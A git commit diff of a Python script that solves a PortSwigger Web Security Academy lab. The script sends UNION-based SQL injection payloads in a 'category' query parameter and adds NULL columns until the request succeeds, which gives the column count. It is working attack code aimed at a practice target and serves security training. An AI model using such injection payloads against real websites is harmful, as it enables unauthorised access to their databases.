2d896d19a1952046a822681bb6762bab033c923c
Fauxsys <soseccon@gmail.com>
2019-04-28 22:32:55 -0400

    First lab for SQL injection UNION attacks
    Update based on skills gained during lab 3

--- sqli_union_lab_1.py
+++ sqli_union_lab_1.py
@@ -5,23 +5,43 @@ import sys
 # Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
 
 # API Parameters
-url = 'https://abcd.web-security-academy.net/page'
+url = 'https://abcd.web-security-academy.net/'
+url = f'{url}page'
 params = {'category': 'Lifestyle'}
-null = ["'UNION", 'SELECT', 'NULL', '--']
+null = ["'UNION SELECT", 'NULL', '--']
 sqli = {'category': f"Lifestyle{' '.join(null)}"}
 
 # API Request
 api_session = requests.Session()
-response = api_session.get(url, params=sqli)
+response = api_session.get(url, params=params)
 
 if response.status_code == 404:
     sys.exit('The session you are looking for has expired')
 
-while not response.ok:
-    null.pop(-1)
-    null.extend([',NULL', '--'])
-    sqli['category'] = f"Lifestyle{' '.join(null)}"
-    response = api_session.get(url, params=sqli)
 
-print(f"There are {null.count('NULL') + null.count(',NULL')} columns:")
-print(response.url)
+def sqli_union_lab_1(null, sqli):
+    """
+    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing null values.
+    :param null: Copy of global null variable
+    :param sqli: Copy of global sqli variable
+    :return:
+    """
+    # Perform a new requests with sqli parameters
+    lab1 = api_session.get(url, params=sqli)
+
+    while not lab1.ok:
+        # Remove '--' then add ', NULL --' until lab1.ok is True
+        null.remove('--')
+        null.extend([',', 'NULL', '--'])
+
+        # Perform a new request with the updated list
+        sqli['category'] = f"Lifestyle{' '.join(null)}"
+        lab1 = api_session.get(url, params=sqli)
+
+    print(f"There are {null.count('NULL')} columns")
+
+    # Return null since it now has the amount of NULL's required to exploit the application
+    return null
+
+if __name__ == '__main__':
+    null = sqli_union_lab_1(null=null.copy(), sqli=sqli.copy())
